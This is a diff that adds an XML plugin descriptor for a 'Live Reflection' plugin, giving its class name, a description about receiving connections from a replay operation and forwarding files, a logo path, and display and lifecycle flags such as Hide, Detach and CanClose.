@@ -1,0 +1,16 @@
+<Plugin id="13">
+	<Name>Live Reflection</Name>
+	<Class>ddb.dsz.plugin.mirror.LiveMirror</Class>
+	<Description>Receive connections from a replay operation and forward files to it.</Description>
+	<Logo>images/config-users.png</Logo>
+	<Live>true</Live>
+	<Replay>false</Replay>
+	<UserStartable>false</UserStartable>
+	<Hide>true</Hide>
+	<Unhide>true</Unhide>
+	<Detach>true</Detach>
+	<UserClose>false</UserClose>
+	<CanClose>false</CanClose>
+	<VerifyClose>false</VerifyClose>
+	<SpawnDetached>false</SpawnDetached>
+</Plugin>
